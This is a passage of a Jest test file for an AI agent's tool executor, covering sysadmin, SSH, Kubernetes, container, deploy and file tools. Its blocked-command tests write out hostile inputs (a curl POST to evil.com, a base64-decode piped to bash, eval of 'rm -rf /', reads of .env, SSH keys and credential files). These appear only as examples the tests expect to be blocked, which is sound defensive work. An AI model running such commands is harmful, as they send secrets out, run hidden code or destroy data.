        action: "user_manage",
        user_action: "unknown_action",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown user_action");
    });
  });

  describe("sysadmin firewall", () => {
    it("firewall requires firewall_action", async () => {
      const result = await executeTool("sysadmin", { action: "firewall" });
      expect(result).toContain("ERROR");
      expect(result).toContain("firewall_action");
    });

    it("firewall allow requires port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "allow",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port");
    });

    it("firewall deny requires port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "deny",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port");
    });

    it("firewall remove requires port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "remove",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port");
    });

    it("firewall unknown action", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "unknown",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown firewall_action");
    });
  });

  describe("sysadmin cron", () => {
    it("cron requires cron_action", async () => {
      const result = await executeTool("sysadmin", { action: "cron" });
      expect(result).toContain("ERROR");
      expect(result).toContain("cron_action");
    });

    it("cron list runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "list",
      });
      expect(typeof result).toBe("string");
    });

    it("cron add requires schedule", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "add",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("schedule");
    });

    it("cron add requires command", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "add",
        schedule: "* * * * *",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("command");
    });

    it("cron remove requires command", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "remove",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("command");
    });

    it("cron unknown action", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "unknown",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown cron_action");
    });
  });

  describe("sysadmin ssl_check", () => {
    it("ssl_check requires domain or cert_path", async () => {
      const result = await executeTool("sysadmin", { action: "ssl_check" });
      expect(result).toContain("ERROR");
      expect(result).toContain("domain or cert_path");
    });
  });

  describe("sysadmin log_tail", () => {
    it("log_tail requires path", async () => {
      const result = await executeTool("sysadmin", { action: "log_tail" });
      expect(result).toContain("ERROR");
      expect(result).toContain("path is required");
    });

    it("log_tail reads file locally", async () => {
      const logFile = path.join(tmpDir, "test.log");
      fs.writeFileSync(logFile, "line1\nline2\nline3\n");
      const result = await executeTool("sysadmin", {
        action: "log_tail",
        path: logFile,
        lines: 2,
      });
      expect(typeof result).toBe("string");
    });
  });

  describe("sysadmin find_large", () => {
    it("runs find_large locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "find_large",
        path: tmpDir,
        min_size: "1G",
        limit: 5,
      });
      expect(typeof result).toBe("string");
    });
  });

  describe("sysadmin disk_usage", () => {
    it("runs disk_usage with path", async () => {
      const result = await executeTool("sysadmin", {
        action: "disk_usage",
        path: tmpDir,
      });
      expect(typeof result).toBe("string");
    });
  });

  describe("sysadmin kill_process", () => {
    it("requires pid or process_name", async () => {
      const result = await executeTool("sysadmin", { action: "kill_process" });
      expect(result).toContain("ERROR");
      expect(result).toContain("pid or process_name");
    });
  });

  describe("sysadmin service", () => {
    it("service requires service_action", async () => {
      const result = await executeTool("sysadmin", { action: "service" });
      expect(result).toContain("ERROR");
      expect(result).toContain("service_action");
    });

    it("service requires service_name for non-list_failed", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("service_name");
    });

    it("unknown service_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "unknown",
        service_name: "test",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown service_action");
    });
  });

  describe("sysadmin journalctl", () => {
    it("runs journalctl with all params", async () => {
      const result = await executeTool("sysadmin", {
        action: "journalctl",
        lines: 5,
        unit: "sshd.service",
        priority: "warning",
        since: "2 hours ago",
      });
      expect(typeof result).toBe("string");
    });

    it("runs journalctl with unit without .service suffix", async () => {
      const result = await executeTool("sysadmin", {
        action: "journalctl",
        unit: "nginx",
      });
      expect(typeof result).toBe("string");
    });
  });

  describe("sysadmin unknown action", () => {
    it("returns error for unknown sysadmin action", async () => {
      const result = await executeTool("sysadmin", {
        action: "nonexistent_action",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown sysadmin action");
    });
  });

  describe("sysadmin action cancelled", () => {
    it("non-readonly action cancelled when user declines", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "sysadmin",
        { action: "kill_process", pid: 999999 },
        { autoConfirm: false },
      );
      expect(result).toBe("Cancelled.");
    });
  });

  // ─── frontend_recon ───────────────────────────────────────────
  describe("frontend_recon", () => {
    (process.env.RUN_INTEGRATION ? it : it.skip)(
      "runs frontend_recon in cwd",
      async () => {
        const result = await executeTool("frontend_recon", {});
        expect(typeof result).toBe("string");
        expect(result).toContain("Design recon complete");
      },
      30000,
    );

    (process.env.RUN_INTEGRATION ? it : it.skip)(
      "frontend_recon with type hint",
      async () => {
        const result = await executeTool("frontend_recon", { type: "button" });
        expect(typeof result).toBe("string");
        expect(result).toContain("STEP 1");
      },
      30000,
    );
  });

  // ─── remote_agent validation ──────────────────────────────────
  describe("remote_agent", () => {
    (process.env.CI ? it.skip : it)(
      "runs with user@host format (will fail SSH)",
      async () => {
        const result = await executeTool("remote_agent", {
          server: "user@nonexistent-host-xyz",
          task: "echo hello",
        });
        expect(typeof result).toBe("string");
        // Will contain ERROR since host is unreachable
        expect(result).toMatch(/ERROR|SSH|exited|timed/i);
      },
    );
  });

  // ─── gh_workflow_trigger validation ───────────────────────────
  describe("gh_workflow_trigger validation", () => {
    it("requires workflow", async () => {
      const result = await executeTool("gh_workflow_trigger", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("workflow");
    });
  });

  // ─── k8s validation paths ────────────────────────────────────
  describe("k8s_apply validation", () => {
    it("requires file or manifest", async () => {
      const result = await executeTool("k8s_apply", {});
      expect(result).toContain("ERROR");
    });

    it("apply cancelled", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "k8s_apply",
        { file: "/tmp/test.yaml" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });
  });

  describe("k8s_logs validation", () => {
    it("requires pod", async () => {
      const result = await executeTool("k8s_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("pod");
    });
  });

  describe("k8s_rollout validation", () => {
    it("requires deployment", async () => {
      const result = await executeTool("k8s_rollout", { action: "status" });
      expect(result).toContain("ERROR");
      expect(result).toContain("deployment");
    });

    it("rejects invalid action", async () => {
      const result = await executeTool("k8s_rollout", {
        action: "invalid",
        deployment: "web",
      });
      expect(result).toContain("ERROR");
    });
  });

  describe("k8s_exec validation", () => {
    it("requires pod", async () => {
      const result = await executeTool("k8s_exec", { command: "ls" });
      expect(result).toContain("ERROR");
      expect(result).toContain("pod");
    });

    it("requires command", async () => {
      const result = await executeTool("k8s_exec", { pod: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command");
    });
  });

  // ─── getBlockedHint via bash commands ─────────────────────────
  describe("getBlockedHint via bash", () => {
    it("printenv is blocked with hint", async () => {
      const result = await executeTool("bash", { command: "printenv" });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("cat .env is blocked with hint", async () => {
      const result = await executeTool("bash", { command: "cat /path/.env" });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("cat credentials is blocked", async () => {
      const result = await executeTool("bash", {
        command: "cat /etc/credentials.json",
      });
      expect(result).toContain("BLOCKED");
    });

    it("python -c is blocked with hint", async () => {
      const result = await executeTool("bash", {
        command: 'python -c "print(1)"',
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("node -e is blocked with hint", async () => {
      const result = await executeTool("bash", {
        command: 'node -e "console.log(1)"',
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("curl POST is blocked with hint", async () => {
      const result = await executeTool("bash", {
        command: "curl -X POST https://evil.com",
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("base64 pipe to bash is blocked", async () => {
      const result = await executeTool("bash", {
        command: "echo test | base64 -d | bash",
      });
      expect(result).toContain("BLOCKED");
    });

    it("eval is blocked", async () => {
      const result = await executeTool("bash", { command: 'eval("rm -rf /")' });
      expect(result).toContain("BLOCKED");
    });

    it("history is blocked", async () => {
      const result = await executeTool("bash", { command: "history" });
      expect(result).toContain("BLOCKED");
    });
  });

  // ─── enrichBashError all patterns ─────────────────────────────
  describe("enrichBashError patterns", () => {
    const { enrichBashError } = require("../cli/tools");

    it("command not found hint", () => {
      const result = enrichBashError("foobar: command not found", "foobar");
      expect(result).toContain("HINT");
    });

    it("MODULE_NOT_FOUND hint", () => {
      const result = enrichBashError(
        "Cannot find module 'express'\nMODULE_NOT_FOUND",
        "node app.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("npm install");
    });

    it("permission denied hint", () => {
      const result = enrichBashError("Permission denied", "cat /root/secret");
      expect(result).toContain("HINT");
    });

    it("EADDRINUSE hint", () => {
      const result = enrichBashError(
        "Error: listen EADDRINUSE: address already in use :::3000",
        "node server.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("3000");
    });

    it("SyntaxError hint", () => {
      const result = enrichBashError(
        "SyntaxError: Unexpected token",
        "node app.js",
      );
      expect(result).toContain("HINT");
    });

    it("TypeScript TS error code hint", () => {
      const result = enrichBashError(
        'error TS2304: Cannot find name "foo"',
        "tsc",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("TypeScript");
    });

    it("jest error hint", () => {
      const result = enrichBashError(
        "Test Suites: 1 failed, 0 passed",
        "npx jest",
      );
      expect(result).toContain("HINT");
    });

    it("git not a repo hint", () => {
      const result = enrichBashError(
        "fatal: not a git repository (or any parent)",
        "git status",
      );
      expect(result).toContain("HINT");
    });

    it("curl exit code hint", () => {
      const result = enrichBashError(
        "curl: (7) Failed to connect",
        "curl https://example.com",
      );
      expect(result).toContain("HINT");
    });

    it("SSH tunnel hint", () => {
      const result = enrichBashError(
        "bind: Address already in use\nchannel_setup_fwd_listener",
        "ssh -L 8080:localhost:80 server",
      );
      expect(result).toContain("HINT");
    });
  });

  // ─── autoFixEdit direct test ──────────────────────────────────
  describe("autoFixEdit", () => {
    const { autoFixEdit } = require("../cli/tools");

    it("returns null for no match", () => {
      const result = autoFixEdit(
        "hello world",
        "completely different text that does not match at all even slightly",
        "replacement",
      );
      expect(result).toBeNull();
    });

    it("fixes close match within threshold", () => {
      const content = "function doSomething() {\n  return true;\n}";
      // Typo: doSomthng instead of doSomething
      const result = autoFixEdit(
        content,
        "function doSomthng() {",
        "function doSomethingNew() {",
      );
      if (result) {
        expect(result.content).toContain("doSomethingNew");
        expect(result.distance).toBeGreaterThan(0);
      }
    });
  });

  // ─── edit_file strict mode ────────────────────────────────────
  describe("edit_file strict mode", () => {
    const { getEditMode } = require("../cli/tool-tiers");

    it("strict mode rejects non-exact match", async () => {
      getEditMode.mockReturnValueOnce("strict");
      const fp = path.join(tmpDir, "strict-test.txt");
      fs.writeFileSync(fp, "hello world");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "hello  world",
        new_text: "goodbye",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
    });

    it("strict mode accepts exact match", async () => {
      getEditMode.mockReturnValueOnce("strict");
      const fp = path.join(tmpDir, "strict-exact.txt");
      fs.writeFileSync(fp, "hello world");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "hello world",
        new_text: "goodbye world",
      });
      expect(result).toContain("Edited");
    });
  });

  // ─── patch_file strict mode ───────────────────────────────────
  describe("patch_file strict mode", () => {
    const { getEditMode } = require("../cli/tool-tiers");

    it("strict mode rejects non-exact patch", async () => {
      getEditMode.mockReturnValueOnce("strict");
      const fp = path.join(tmpDir, "strict-patch.txt");
      fs.writeFileSync(fp, "line one\nline two\nline three");
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "line  one", new_text: "line ONE" }],
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
    });
  });

  // ─── write_file chmod +x ─────────────────────────────────────
  describe("write_file chmod", () => {
    it("sets executable for .sh files", async () => {
      const fp = path.join(tmpDir, "test-script.sh");
      const result = await executeTool("write_file", {
        path: fp,
        content: "#!/bin/bash\necho hello",
      });
      expect(result).toContain("Written");
      const stats = fs.statSync(fp);
      expect(stats.mode & 0o111).toBeGreaterThan(0);
    });

    it("sets executable for shebang files", async () => {
      const fp = path.join(tmpDir, "my-script");
      const result = await executeTool("write_file", {
        path: fp,
        content: '#!/usr/bin/env python3\nprint("hello")',
      });
      expect(result).toContain("Written");
      const stats = fs.statSync(fp);
      expect(stats.mode & 0o111).toBeGreaterThan(0);
    });
  });

  // ─── list_directory with pattern ──────────────────────────────
  describe("list_directory with pattern", () => {
    it("filters by pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "foo.js"), "x");
      fs.writeFileSync(path.join(tmpDir, "bar.txt"), "x");
      const result = await executeTool("list_directory", {
        path: tmpDir,
        pattern: "*.js",
      });
      expect(result).toContain("foo.js");
      expect(result).not.toContain("bar.txt");
    });

    it("returns error for nonexistent directory", async () => {
      const result = await executeTool("list_directory", {
        path: path.join(tmpDir, "nonexistent-dir-xyz-123"),
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── read_file with offset and limit ──────────────────────────
  describe("read_file with offset/limit", () => {
    it("reads with offset and limit", async () => {
      const fp = path.join(tmpDir, "offset-test.txt");
      fs.writeFileSync(fp, "line1\nline2\nline3\nline4\nline5\n");
      const result = await executeTool("read_file", {
        path: fp,
        line_start: 2,
        line_end: 3,
      });
      expect(result).toContain("line2");
      expect(result).toContain("line3");
    });
  });

  // ─── unknown tool name ────────────────────────────────────────
  describe("unknown tool", () => {
    it("returns error for unknown tool", async () => {
      const result = await executeTool("completely_unknown_tool_xyz", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown tool");
    });
  });

  // ─── resolvePath edge cases ───────────────────────────────────
  describe("resolvePath additional cases", () => {
    it("blocks .docker/config.json (sensitive)", () => {
      const result = resolvePath(os.homedir() + "/.docker/config.json");
      expect(result).toBeNull();
    });

    it("blocks .kube/config (sensitive)", () => {
      const result = resolvePath(os.homedir() + "/.kube/config");
      expect(result).toBeNull();
    });

    it("blocks .npmrc (sensitive)", () => {
      const result = resolvePath(os.homedir() + "/.npmrc");
      expect(result).toBeNull();
    });

    it("blocks .ssh paths (sensitive)", () => {
      const result = resolvePath(os.homedir() + "/.ssh/id_rsa");
      expect(result).toBeNull();
    });

    it("blocks credentials files (sensitive)", () => {
      const result = resolvePath("/etc/credentials.json");
      expect(result).toBeNull();
    });

    it("blocks normal absolute paths outside the workspace", () => {
      const result = resolvePath("/tmp/test-file.txt");
      expect(result).toBeNull();
    });

    it("resolves relative path to cwd", () => {
      const result = resolvePath("package.json");
      expect(result).toBe(path.resolve(process.cwd(), "package.json"));
    });
  });

  // ─── deployment_status no configs ─────────────────────────────
  describe("deployment_status", () => {
    it("returns message when no deploy configs exist", async () => {
      const result = await executeTool("deployment_status", {});
      // Either shows no configs or attempts to check configs
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin process_list ────────────────────────────────────
  describe("sysadmin process_list", () => {
    it("runs process_list sorted by cpu", async () => {
      const result = await executeTool("sysadmin", {
        action: "process_list",
        sort_by: "cpu",
        limit: 5,
      });
      expect(typeof result).toBe("string");
    });

    it("runs process_list sorted by mem", async () => {
      const result = await executeTool("sysadmin", {
        action: "process_list",
        sort_by: "mem",
        limit: 5,
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin package validation ──────────────────────────────
  describe("sysadmin package validation", () => {
    it("package requires package_action", async () => {
      const result = await executeTool("sysadmin", { action: "package" });
      expect(result).toContain("ERROR");
      expect(result).toContain("package_action");
    });

    it("package install requires packages", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "install",
      });
      expect(result).toContain("ERROR");
    });

    it("package remove requires packages", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "remove",
      });
      expect(result).toContain("ERROR");
    });

    it("package update requires packages", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "update",
      });
      expect(result).toContain("ERROR");
    });

    it("unknown package_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "unknown",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── brain_write validation ───────────────────────────────────
  describe("brain_write validation", () => {
    it("requires name", async () => {
      const result = await executeTool("brain_write", {
        content: "x",
        mode: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("name");
    });

    it("requires content", async () => {
      const result = await executeTool("brain_write", {
        name: "x",
        mode: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("content");
    });

    it("requires mode", async () => {
      const result = await executeTool("brain_write", {
        name: "x",
        content: "y",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("mode");
    });
  });

  // ─── task_list validation ─────────────────────────────────────
  describe("task_list validation", () => {
    it("requires action", async () => {
      const result = await executeTool("task_list", {});
      expect(result).toContain("ERROR");
    });

    it("create requires tasks", async () => {
      const result = await executeTool("task_list", {
        action: "create",
        name: "test",
      });
      expect(result).toContain("ERROR");
    });

    it("update requires task_id", async () => {
      const result = await executeTool("task_list", { action: "update" });
      expect(result).toContain("ERROR");
    });
  });

  // ─── glob with mtime sorting ──────────────────────────────────
  describe("glob mtime sorting", () => {
    it("sorts by mtime newest first", async () => {
      const dir = path.join(tmpDir, "glob-mtime");
      fs.mkdirSync(dir);
      fs.writeFileSync(path.join(dir, "old.txt"), "old");
      // Ensure different mtime
      const oldTime = new Date(Date.now() - 5000);
      fs.utimesSync(path.join(dir, "old.txt"), oldTime, oldTime);
      fs.writeFileSync(path.join(dir, "new.txt"), "new");

      const result = await executeTool("glob", { pattern: "*.txt", path: dir });
      const lines = result.split("\n").filter((l) => l.includes(".txt"));
      if (lines.length >= 2) {
        expect(lines[0]).toContain("new.txt");
      }
    });
  });

  // ─── search_files basic ───────────────────────────────────────
  describe("search_files edge cases", () => {
    it("returns no matches when pattern not found", async () => {
      const result = await executeTool("search_files", {
        pattern: "xyznonexistentpattern12345",
        path: tmpDir,
      });
      expect(result).toContain("no matches");
    });
  });

  // ─── SSH tools with mocked resolveProfile ─────────────────────
  describe("ssh_exec with mocked SSH", () => {
    it("runs command successfully on remote server", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
        key: "~/.ssh/id_rsa",
      });
      mockSshExec.mockResolvedValue({
        stdout: "hello world",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: "echo hello",
      });
      expect(result).toBe("hello world");
    });

    it("returns exit code on failure", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "",
        stderr: "not found",
        exitCode: 127,
        error: "bash: foo: command not found",
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: "foo",
      });
      expect(result).toContain("EXIT 127");
    });

    it("handles destructive command cancellation", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "ssh_exec",
        { server: "production", command: "rm -rf /tmp/old" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });

    it("handles sudo command", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "root",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: "whoami",
        sudo: true,
      });
      expect(result).toBe("root");
    });

    it("blocks grep of .env file on remote host", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: 'grep -i "GOOGLE" /home/deploy/server-agent/.env',
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("SSH secret-exposure");
    });

    it("blocks cat of credentials file on remote host", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command:
          "cat /home/deploy/server-agent/credentials/google-credentials.json",
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("SSH secret-exposure");
    });

    it("blocks grep of private_key on remote host", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: "grep private_key /some/file.json",
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("SSH secret-exposure");
    });

    it("allows safe grep commands that do not target secret files", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "result",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("ssh_exec", {
        server: "production",
        command: 'grep -r "error" /var/log/app.log',
      });
      expect(result).not.toContain("BLOCKED");
      expect(result).toBe("result");
    });
  });

  describe("ssh_upload with mocked SSH", () => {
    it("uploads file successfully", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockScpUpload.mockResolvedValue("Uploaded: test.txt -> /tmp/test.txt");
      const result = await executeTool("ssh_upload", {
        server: "production",
        local_path: "/tmp/test.txt",
        remote_path: "/tmp/test.txt",
      });
      expect(result).toContain("Uploaded");
    });

    it("handles upload cancellation", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "ssh_upload",
        {
          server: "production",
          local_path: "/tmp/test.txt",
          remote_path: "/tmp/test.txt",
        },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });

    it("handles upload error", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockScpUpload.mockRejectedValue(new Error("Connection refused"));
      const result = await executeTool("ssh_upload", {
        server: "production",
        local_path: "/tmp/test.txt",
        remote_path: "/tmp/test.txt",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Connection refused");
    });
  });

  describe("ssh_download with mocked SSH", () => {
    it("downloads file successfully", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockScpDownload.mockResolvedValue(
        "Downloaded: /tmp/remote.txt -> /tmp/local.txt",
      );
      const result = await executeTool("ssh_download", {
        server: "production",
        remote_path: "/tmp/remote.txt",
        local_path: "/tmp/local.txt",
      });
      expect(result).toContain("Downloaded");
    });

    it("handles download error", async () => {
      mockResolveProfile.mockReturnValue({
        host: "test.example.com",
        user: "deploy",
      });
      mockScpDownload.mockRejectedValue(new Error("File not found"));
      const result = await executeTool("ssh_download", {
        server: "production",
        remote_path: "/tmp/remote.txt",
        local_path: "/tmp/local.txt",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── service_manage with mocked SSH ────────────────────────────
  describe("service_manage with mocked SSH", () => {
    it("runs status on remote server", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "active (running)",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("service_manage", {
        service: "nginx",
        action: "status",
        server: "server1",
      });
      expect(result).toContain("active (running)");
    });

    it("runs restart on remote with confirmation", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({ stdout: "", stderr: "", exitCode: 0 });
      const result = await executeTool("service_manage", {
        service: "nginx",
        action: "restart",
        server: "server1",
      });
      expect(result).toContain("OK");
    });

    it("handles service not found on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "",
        stderr: "Unit notfound.service not found",
        exitCode: 4,
      });
      const result = await executeTool("service_manage", {
        service: "notfound",
        action: "status",
        server: "server1",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("not found");
    });
  });

  // ─── service_logs with mocked SSH ─────────────────────────────
  describe("service_logs with mocked SSH", () => {
    it("reads logs from remote server", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Mar 19 nginx log line 1\nMar 19 nginx log line 2",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("service_logs", {
        service: "nginx",
        server: "server1",
        lines: 10,
      });
      expect(result).toContain("nginx log line");
    });

    it("handles remote log error", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "",
        stderr: "unit not found",
        exitCode: 1,
        error: "Unit not loaded",
      });
      const result = await executeTool("service_logs", {
        service: "nonexistent",
        server: "server1",
      });
      expect(result).toContain("EXIT 1");
    });
  });

  // ─── container tools with mocked SSH ──────────────────────────
  describe("container_list with mocked SSH", () => {
    it("lists containers on remote server", async () => {
      mockResolveProfile.mockReturnValue({
        host: "docker1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "CONTAINER ID  NAMES  IMAGE  STATUS\nabc123  web  nginx  Up 2h",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("container_list", { server: "docker1" });
      expect(result).toContain("web");
    });
  });

  describe("container_logs with mocked SSH", () => {
    it("reads logs from remote container", async () => {
      mockResolveProfile.mockReturnValue({
        host: "docker1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "container log output here",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("container_logs", {
        container: "web",
        server: "docker1",
      });
      expect(result).toContain("container log output");
    });
  });

  describe("container_exec with mocked SSH", () => {
    it("runs command in remote container", async () => {
      mockResolveProfile.mockReturnValue({
        host: "docker1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "hello from container",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("container_exec", {
        container: "web",
        command: "echo hello",
        server: "docker1",
      });
      expect(result).toBe("hello from container");
    });
  });

  describe("container_manage with mocked SSH", () => {
    it("stops remote container", async () => {
      mockResolveProfile.mockReturnValue({
        host: "docker1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({ stdout: "web", stderr: "", exitCode: 0 });
      const result = await executeTool("container_manage", {
        container: "web",
        action: "stop",
        server: "docker1",
      });
      expect(result).toContain("web");
    });

    it("inspects remote container", async () => {
      mockResolveProfile.mockReturnValue({
        host: "docker1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: '{"Id":"abc","Name":"web"}',
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("container_manage", {
        container: "web",
        action: "inspect",
        server: "docker1",
      });
      expect(result).toContain("abc");
    });
  });

  // ─── deploy tool with mocked SSH ──────────────────────────────
  describe("deploy with mocked SSH", () => {
    it("deploys via git pull on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Already up to date.",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("deploy", {
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
      });
      expect(result).toContain("Deployed");
      expect(result).toContain("git");
    });

    it("deploy git dry run", async () => {
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      const result = await executeTool("deploy", {
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
        dry_run: true,
      });
      expect(result).toContain("DRY RUN");
      expect(result).toContain("git");
    });

    it("deploy git with branch", async () => {
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Switched to branch main",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("deploy", {
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
        branch: "main",
      });
      expect(result).toContain("Deployed");
    });

    it("deploy git pull failure", async () => {
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "",
        stderr: "fatal: not a git repository",
        exitCode: 128,
        error: "fatal: not a git repository",
      });
      const result = await executeTool("deploy", {
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("git pull");
    });

    it("deploy with deploy_script", async () => {
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec
        .mockResolvedValueOnce({ stdout: "Updated.", stderr: "", exitCode: 0 })
        .mockResolvedValueOnce({
          stdout: "Restarted",
          stderr: "",
          exitCode: 0,
        });
      const result = await executeTool("deploy", {
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
        deploy_script: "systemctl restart app",
      });
      expect(result).toContain("Deployed");
      expect(result).toContain("Restarted");
    });

    it("deploy cancelled by user", async () => {
